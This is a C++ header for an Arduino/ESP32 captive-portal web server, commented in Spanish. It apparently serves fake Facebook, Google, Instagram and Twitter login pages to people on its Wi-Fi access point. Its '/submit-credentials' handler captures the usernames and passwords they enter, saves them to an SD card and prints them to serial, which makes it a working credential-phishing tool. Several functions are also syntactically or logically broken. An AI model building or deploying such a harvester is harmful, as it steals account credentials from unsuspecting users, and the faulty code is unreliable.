/*!
 * \file WebServerHandler.h
 * \author NGUEYOU SIMO, Neil L.; 
 * \brief Provee la declaración y documentación de la clase WebServerManager y sus métodos para manejar un servidor web y un servicio DNS en un entorno Arduino.
 *
 * Este archivo define la lógica de un portal cautivo, la carga y lectura de archivos desde la SD, la autenticación de un panel de administración,
 * y la gestión de credenciales que se envían mediante formularios HTTP, entre otras funcionalidades relacionadas con la comunicación web.
 * \class WebServerManager
 * \brief Clase principal que administra un servidor web y un servicio DNS para ofrecer un portal cautivo y funcionalidades de administración.
 *
 * Provee métodos para inicializar y procesar requerimientos de un servidor web, manejar solicitudes de diferentes rutas (endpoints),
 * así como gestionar la lectura y escritura de documentos en una tarjeta SD. También se encarga de la validación de credenciales
 * de administración y el manejo de eventos.
 */

#ifndef WEB_SERVER_HANDLER_H
#define WEB_SERVER_HANDLER_H

#include "include.h"



class WebServerManager
{
protected:
    WebServer*             m_server;
    DNSServer*             m_dnsServer;
    SDCardManager*         m_sdManager;
//    AuthenticationManager* m_authManager;
    String m_indexPage = "\0";
    String m_exitPage  = "\0";
    String m_adminPage = "\0";
    String m_datafile  = "\0";
    String m_facebook  = "\0";
    String m_google    = "\0";
    String m_instagram = "\0";
    String m_twitter   = "\0";

    uint8_t       _loginAttempts   = 0;
    unsigned long _lastAttemptTime = 0;

    /*!
    * \brief Inicia el servidor DNS para redirigir todo dominio a la IP del portal cautivo.
    *
    * Llama al método start(...) del objeto DNS configurando el puerto y la IP local, permitiendo capturar las solicitudes de los clientes.
    */
    inline void setupCaptivePortal() { m_dnsServer->start(DNS_PORT, "*", WiFi.softAPIP()); }

    /*!
    * \brief Determina el tipo de contenido (MIME) a partir de la extensión de un archivo.
    *
    * Retorna diferentes MIME types (text/html, image/png, etc.) o "application/octet-stream" si no se reconoce la extensión.
    */
    inline String getContentType(String& filename)
    {
        if      (filename.endsWith(".html")) return "text/html";
        else if (filename.endsWith(".htm"))  return "text/html";
        else if (filename.endsWith(".css"))  return "text/css";
        else if (filename.endsWith(".js"))   return "application/javascript";
        else if (filename.endsWith(".png"))  return "image/png";
        else if (filename.endsWith(".jpg"))  return "image/jpeg";
        else if (filename.endsWith(".gif"))  return "image/gif";
        else if (filename.endsWith(".ico"))  return "image/x-icon";
        else if (filename.endsWith(".txt"))  return "text/plain";
        else if (filename.endsWith(".json")) return "application/json";
        else if (filename.endsWith(".xml"))  return "text/xml";
        else if (filename.endsWith(".pdf"))  return "application/pdf";
        else if (filename.endsWith(".zip"))  return "application/zip";

        return "application/octet-stream";
    }

    /*!
    * \brief Manejador para la ruta raíz del punto de acceso ("/").
    *
    * Lee el contenido de la página de índice desde la SD y la envía al cliente que hizo la solicitud.
    */
    inline void handleRoot()
    {
        String content = m_sdManager->readFile(m_indexPage);
        m_server->send(200, "text/html", content);
        Serial.println("New connection....");
    }

    /*!
    * \brief Manejador para la ruta que recibe credenciales de formulario ("/submit-credentials").
    *
    * Captura la plataforma, usuario y contraseña enviados por POST, los almacena (o registra en log) y devuelve respuesta al cliente.
    */
    inline void handleSubmitCredentials()
    {
        //variables para almacenar temporalmente las entradas del usuario
        String credentials = "platform: " + m_server->arg("platform");
        credentials.concat("\nuid: " + m_server->arg("username"));
        credentials.concat("\npsw: " + m_server->arg("password"));

        //guarda las entradas en un archivo de texto
        // m_sdManager->appendFile(m_datafile, credentials);
        if (!saveToDataFile(credentials))
        {
            m_sdManager->logEvent("Failed to save credentials.");
    #if (WITH_ERROR_TYPE)
            Serial.println(ERROR_SAVE_CREDENTIALS);
    #endif
        }

        //se imprime por consola los valores de las entradas
        Serial.println("Social network: "+ m_server->arg("platform"));
        Serial.println("Username: "+ m_server->arg("username"));
        Serial.println("Password: "+ m_server->arg("password"));
        //se envia una respuesta al cliente
        m_server->send(201, "text/plain", "");
    }

    /*
    inline void handleSubmit()
    {
        //variables para almacenar temporalmente las entradas del usuario
        String credentials = "uid: " + m_server->arg("username");
        //String password
        credentials.concat("\npsw: " + m_server->arg("password"));

        //se imprime por consola los valores de las entradas
        Serial.println("Facebook id: "+ m_server->arg("username"));
        Serial.println("Password: "+ m_server->arg("password"));

        m_server->sendHeader("Location", "http://www.google.com");
        m_server->send(302, "text/plain", "Redirecting");

        Serial.print("There are currently ");
        Serial.print(WiFi.softAPgetStationNum());
        Serial.print(" hosts connected.\n");
    }
    */
   
   /*!
    * \brief Manejador para el inicio de sesión de administrador en el servidor ("/" en el ejemplo).
    *
    * Valida usuario y contraseña mediante el manejador de autenticación; si son correctos, redirige al panel de administrador;
    * de lo contrario, envía un estado de acceso denegado.
    */
    inline void handleAdminLogin()
    {
        //String username = m_server->arg("username");
        //String password = m_server->arg("password");

        if (validateAdminCredentials(m_server->arg("username"), m_server->arg("password")))
        {
            m_server->sendHeader("Location", "/admin-panel");
            m_server->send(302, "text/plain", "Authorized: redirecting to admin panel");
            Serial.println("New admin connection....");
        }
        else
        {
            m_server->send(401, "text/plain", "Access Denied");
            Serial.println("Intento de connexión como admin fallado.");
        }
    }

    /*!
    * \brief Manejador para la ruta del panel de administración ("/admin-panel").
    *
    * Carga la página HTML correspondiente al panel de administración desde la SD y la envía al cliente.
    */
    inline void handleAdminPanel()
    {
        //TODO the panel page crashes every time, while the replace logic is correct
        generateJSONFile();

        String* adminContent = new String(m_sdManager->readFile(m_adminPage));
        adminContent->replace(Placeholder_t::AccessPointSSID, WiFi.softAPSSID());
        adminContent->replace(Placeholder_t::ServerIP, WiFi.softAPIP().toString());
        adminContent->replace(Placeholder_t::HostsConected, String(WiFi.softAPgetStationNum()));

        if (WiFi.status() == WL_CONNECTED)
        {
            adminContent->replace(Placeholder_t::WifiSSID, WiFi.SSID());
            adminContent->replace(Placeholder_t::ClientIP, WiFi.localIP().toString());
            adminContent->replace(Placeholder_t::WifiStatus, "Conectado");
        }
        else
        {
            adminContent->replace(Placeholder_t::WifiSSID, WiFi.SSID());
            adminContent->replace(Placeholder_t::ClientIP, WiFi.localIP().toString());
            adminContent->replace(Placeholder_t::WifiStatus, "No Conectado");
        }
        m_server->send(200, "text/html", adminContent);
    }

    /*!
    * \brief Manejador para la subida de archivos al servidor (vía formulario o HTTP POST).
    *
    * Permite recibir un archivo en trozos (porciones) y guardarlo en la tarjeta SD. Al finalizar, notifica el éxito o el fallo.
    */
    inline void handleFileUpload()
    {
        HTTPUpload& upload = m_server->upload();
        File* uploadFile;

        if (upload.status == UPLOAD_FILE_START)
        {
            String filename = upload.filename;
            if (!filename.startsWith("/")) filename = "/" + filename;
            
            m_sdManager->logEvent("File Upload Started: " + filename);
            
            uploadFile = new File(m_sdManager->getFileSystem().open(filename, FILE_WRITE));
        } 
        else if (upload.status == UPLOAD_FILE_WRITE)
        {
            if (*uploadFile) {
                uploadFile->write(upload.buf, upload.currentSize);
            }
        } 
        else if (upload.status == UPLOAD_FILE_END)
        {
            if (*uploadFile)
            {
                uploadFile->close();
                m_sdManager->logEvent("File Upload Complete: " + upload.filename);
                m_server->send(200, "text/plain", "File Uploaded Successfully");
            }
            else
            {
                m_server->send(500, "text/plain", "Upload Failed");
            }
        }
    }

    /*!
    * \brief Manejador para listar los archivos presentes en el directorio raíz de la tarjeta SD.
    *
    * Retorna al cliente un arreglo JSON con los nombres de los archivos encontrados.
    */
    inline void handleFileList()
    {
        File root = m_sdManager->getFileSystem().open("/");
        String fileList = "[";
        
        while (true)
        {
            File entry = File(root.openNextFile());
            if (!entry) break;
            
            fileList += "\"" + String(entry.name()) + "\",";
            entry.close();
        }
        
        // Remove last comma and close JSON array
        if (fileList.endsWith(","))
            fileList = fileList.substring(0, fileList.length() - 1);
        
        fileList += "]";
        
        m_server->send(200, "application/json", fileList);

    }

    /*!
    * \brief Manejador para configurar la red WiFi vía formulario.
    *
    * Permite al usuario introducir un SSID y contraseña; si son válidos, se guarda el contenido en la tarjeta SD e informa de la actualización.
    */
    inline void handleWiFiConfig()
    {
        if (m_server->method() == HTTP_POST)
        {
            String newSSID = m_server->arg("ssid");
            String newPassword = m_server->arg("password");
            
            // Validate input
            if (newSSID.length() >= 1 && newPassword.length() >= 8)
            {
                // Save configuration to SD card
                String config = newSSID + "\n" + newPassword;
                m_sdManager->writeFile("/wifi_config.txt", config);
                
                m_server->send(200, "text/plain", "WiFi Configuration Updated");
            }
            else
            {
                m_server->send(400, "text/plain", "Invalid Configuration");
            }
        }
    }

    /*!
    * \brief Manejador que redirige al usuario a la página raíz si accede a una ruta no encontrada.
    *
    * Se utiliza principalmente para forzar la captura de la conexión en modo AP y mostrar la página de inicio.
    */
    inline void handleCaptivePortal()
    {
        m_server->sendHeader("Location", "/");
        m_server->send(302, "text/plain", "redirect to captive portal");
    }

    /*!
    * \fn bool WebServerManager::saveToDataFile(String data)
    * \brief Función auxiliar para guardar de forma confiable datos recibidos, creando el directorio si no existe.
    *
    * \param data Contenido que se escribirá en el archivo configurado como archivo de datos.
    * \return true si la operación fue satisfactoria, false en caso contrario.
    */
    inline bool saveToDataFile(String data)
    {
        String dir = m_sdManager->getFileDir(m_datafile);
        if (!m_sdManager->getFileSystem().exists(dir))
        {
            if (!m_sdManager->createDir(dir)) return 0;
        }
        
        return m_sdManager->appendFile(m_datafile, data)? 1 : 0;
    }


    //inline bool validateAdminCredentials()
    inline bool validateAdminCredentials(const String& username, const String& password)
    {
        // Check login attempts and lockout
        if (_loginAttempts >= MAX_LOGIN_ATTEMPTS && 
            (millis() - _lastAttemptTime) < LOGIN_LOCKOUT_TIME)
        {
            return 0;
        }

        //bool validCredentials = m_server->authenticate(ADMIN_USERNAME, ADMIN_PASSWORD);  
        bool validCredentials = ( username == ADMIN_USERNAME && 
                        password == ADMIN_PASSWORD);

        if (!validCredentials)
        {
            _loginAttempts++;
            _lastAttemptTime = millis();
            m_sdManager->logEvent("Intento de connexión como admin fallado. Número de intentos: "+ String(_loginAttempts));
            //m_server->requestAuthentication();
        }
        else
        {
            m_sdManager->logEvent("Nueva connexión administrador");
            _loginAttempts = 0;
        }

        return validCredentials;
    }


public:
    /*!
    * \brief Constructor por defecto que inicializa los apuntadores a nulo.
    *
    * Crea un objeto de tipo WebServerManager, pero no establece la configuración de la red ni la lógica del servidor.
    */
    WebServerManager()
        : m_server(nullptr), m_dnsServer (nullptr), m_sdManager(nullptr)
    {
    }

    /*!
    * \brief Constructor que inicializa los servicios de servidor web y DNS con referencias a la tarjeta SD y autenticación.
    *
    * \param sd Puntero a la clase SDCardManager para manejar archivos.
    * \param auth Puntero a la clase AuthenticationManager para validar credenciales de administrador.
    * \param port Puerto en el que se iniciará el servidor web.
    */
    WebServerManager(SDCardManager* sd, uint8_t port = SERVER_PORT) 
        : m_server(new WebServer (&port)), m_dnsServer (new DNSServer()), m_sdManager(sd)
    {
    }

    WebServerManager(const WebServerManager&) = delete;

    WebServerManager operator= (const WebServerManager&) = delete;

    /*!
    * \brief Destructor de la clase que libera la memoria asignada.
    *
    * Destruye los objetos creados dinámicamente, incluyendo el servidor web, el servidor DNS, el manejador de SD y el manejador de autenticación.
    */
    virtual ~WebServerManager()
    {
        delete m_server,
               m_dnsServer,
               m_sdManager;
    }


    /*!
    * \brief Inicia la lógica del DNS y configura las rutas (endpoints) principales del servidor web.
    *
    * Define las rutas para la pantalla de administración, la recepción de credenciales
    * y la función que se llama cuando las rutas no coinciden con ninguna definida (redireccionamiento al portal cautivo).
    */
    inline void start()
    {
        //setupCaptivePortal(); <-- shouldn't setup captive portal for the server

        // Configure web server routes
        // m_server->on("/", HTTP_GET, [this]() { handleRoot(); });  <- for the captive portal access point
        // m_server->on("/submit", HTTP_POST, [this]() { handleSubmit(); });
        // m_server->on("/login", HTTP_POST, [this]() { handleLogin(); });
        m_server->on("/", HTTP_GET, [this]() {
            String content = m_sdManager->readFile(m_indexPage);
            m_server->send(200, "text/html", content);
        });
        m_server->on("/login", HTTP_POST, [this]() { handleAdminLogin(); });
        m_server->on("/admin-panel", HTTP_GET, [this]() { handleAdminPanel(); });
        m_server->on("/submit-credentials", HTTP_POST, [this]() { handleSubmitCredentials(); });
        m_server->onNotFound([this]() { handleCaptivePortal(); });

        // Start servers
        m_server->begin();
#if (WITH_SUCCESS_MESSAGE)
        Serial.println(SUCCESS_SERVER_INIT);
#endif
    }

    /*!
    * \brief Procesa las peticiones entrantes tanto del servidor DNS como del servidor web.
    *
    * Debe llamarse de forma frecuente dentro del loop principal de Arduino para manejar solicitudes DNS y HTTP.
    */
    inline void process()
    {
        m_dnsServer->processNextRequest();
        m_server->handleClient();
    }


    /*!
    * \brief Asigna la ruta de archivo en la tarjeta SD a un tipo de archivo específico.
    *
    * \param path Ruta o nombre del archivo (o directorio) a asignar.
    * \param fileType Tipo de archivo que se configura (p.ej. página de índice, archivo de datos, etc.).
    */
    inline void setPath(const char* path, FileType_t fileType)
    {
        switch (fileType)
        {
            case ADMINPAGE: m_adminPage = path;
                break;

            case INDEXPAGE: m_indexPage = path;
                break;

            case DATAFILE: m_datafile = path;
                break;
            
            case EXITPAGE: m_exitPage = path;
                break;
            /*
            case LOGFILE: m_sdManager->setPath(path);
                break;
            */
#if (WITH_ERROR_TYPE)
            default:
                Serial.printf(ERROR_FILE_TYPE, (char*) fileType);
                break;
#endif
        }
    }

    /*!
    * \brief Sobrecarga que recibe una cadena String para asignar la ruta a un tipo de archivo.
    *
    * \param path Cadena con la ruta o nombre del archivo (o directorio).
    * \param fileType Tipo de archivo que se configura.
    */
    inline void setPath(const String& path, FileType_t fileType)
    {
        switch (fileType)
        {
            case ADMINPAGE: m_adminPage = path;
                break;
                
            case INDEXPAGE: m_indexPage = path;
                break;

            case DATAFILE: m_datafile = path;
                break;
            
            case EXITPAGE: m_exitPage = path;
                break;
            /*
            case LOGFILE: m_sdManager->setPath(path);
                break;
            */
#if (WITH_ERROR_TYPE)
            default:
                Serial.printf(ERROR_FILE_TYPE, (char*) fileType);
                break;
#endif
        }
    }

    /*!
    * \brief Asigna la ruta o archivo correspondiente a una plataforma concreta (Facebook, Google, etc.).
    *
    * Abre el archivo para verificar si es un directorio e internamente ajusta la ruta final necesaria.
    *
    * \param path Ruta o nombre del archivo (o directorio) que contiene la plataforma.
    * \param platform Plataforma social a asignar.
    */
    inline void setPath(const char* path, Platform_t platform)
    {
        File* file = new File(m_sdManager->getFileSystem().open(path));
        switch (platform)
        {
            case FACEBOOK:
                if (file->isDirectory()) m_facebook = String(path) + "/index.html";
                else m_facebook = path;
                break;

            case GOOGLE:
                if (file->isDirectory()) m_google = String(path) + "/index.html";
                else m_google = path;
                break;
            
            case INSTAGRAM:
                if (file->isDirectory()) m_instagram = String(path) + "/index.html";
                else m_instagram = path;
                break;

            case TWITTER:
                if (file->isDirectory()) m_twitter = String(path) + "/index.html";
                else m_twitter = path;
                break;
#if (WITH_ERROR_TYPE)
            default:
                Serial.printf(ERROR_FILE_TYPE, (char*) platform);
                break;
#endif
        }
        file->close();
        delete file;
    }

    /*!
    * \brief Sobrecarga que recibe una cadena String para asignar la ruta de la plataforma solicitada.
    *
    * \param path Cadena con la ruta o nombre del archivo (o directorio) de la plataforma.
    * \param platform Plataforma social a asignar.
    */
    inline void setPath(const String& path, Platform_t platform)
    {
        File* file = new File(m_sdManager->getFileSystem().open(path));
        switch (platform)
        {
            case FACEBOOK:
                if (file->isDirectory()) m_facebook = path + "/index.html";
                else m_facebook = path;
                break;

            case GOOGLE:
                if (file->isDirectory()) m_google = path + "/index.html";
                else m_google = path;
                break;
            
            case INSTAGRAM:
                if (file->isDirectory()) m_instagram = path + "/index.html";
                else m_instagram = path;
                break;

            case TWITTER:
                if (file->isDirectory()) m_twitter = path + "/index.html";
                else m_twitter = path;
                break;
#if (WITH_ERROR_TYPE)
            default:
                Serial.printf(ERROR_FILE_TYPE, (char*) platform);
                break;
#endif
        }

        file->close();
        delete file;
    }

    //TODO the function doesnt go over the directory and subdirectories
    inline void generateJSONFile(const String& dirname = "/", String& fileList = "");
    {
        File root = m_sdManager->getFileSystem().open(dirname);
        if (dirname == "/")
        {
            fileList += "{ \"file\": [ ";
        }
        
        while (true)
        {
            File entry = root.openNextFile();
            if (!entry ) break;
            while (entry.isDirectory())
            {
                generateJSONFile(entry.path, fileList);
                entry = root.openNextFile();
            }
            
            fileList += "{ \"name\" : \"" + String(entry.name()) + "\",";
            fileList += "  \"path\" : \"" + String(entry.path()) + "\",";
            fileList += "  \"size\" : \"" + String(entry.size()) + "\"},";
            entry.close();
        }
        //delete entry;
        
        // Remove last comma and close JSON array
        if (fileList.endsWith(","))
            fileList = fileList.substring(0, fileList.length() - 1);
        

        if (dirname == "/")
        {
            fileList += " ] }";

            Serial.println("files list: ");
            Serial.println(fileList);
        
            m_sdManager->writeFile(JSON_FILE_PATH, fileList) ? Serial.println(ERROR_GENERATE_JSON);
        }
    }

};
  

#endif //WEB_SERVER_HANDLER_H